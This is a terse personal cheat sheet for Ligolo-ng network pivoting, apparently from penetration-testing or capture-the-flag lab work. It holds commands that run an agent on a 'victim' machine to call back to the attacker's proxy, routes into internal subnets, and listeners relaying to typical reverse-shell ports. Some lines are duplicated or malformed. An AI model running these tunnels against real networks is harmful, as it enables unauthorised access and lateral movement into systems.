## Host Machine
```
sudo ip tuntap add user kali mode tun ligolo 
```

```
sudo ip link set ligolo up
```

```
sudo ./proxy -selfcert -laddr 0.0.0.0:8443
```

```
sudo ./proxy -selfcert -laddr 0.0.0.0:8443
```

## On Victim Machine
```
.\agent.exe -connect 192.168.45.164:8444 -ignore-cert
```

```
./agent -connect 10.10.16.6:8443 -ignore-cert
```

```
.\agent.exe -connect 10.10.16.:443 -ignore-cert
```

## On Host Machine
```
sudo ip route add 10.9.20.0/24 dev ligolo
```

```
sudo ip route add 10.9.10.0/24 dev ligolo
```

```
sudo ip route add 10.9.15.0/24 dev ligolo
```

```
sudo ip route add 192.168.1.0/24 dev ligolo
```
## Listeners
```rust
listener_add --addr 0.0.0.0:443 --to 0.0.0.0:4444
```

```
listener_add --addr 0.0.0.0:80 --to 0.0.0.0:5555
```

.\agent.exe -connect 10.10.14.21:8433 -ignore-cert

listener_add --addr 0.0.0.0:8443 --to 0.0.0.0:8443 --tcp
https://malicious.link/posts/2020/run-as-system-using-evil-winrm/

10.129.0.1


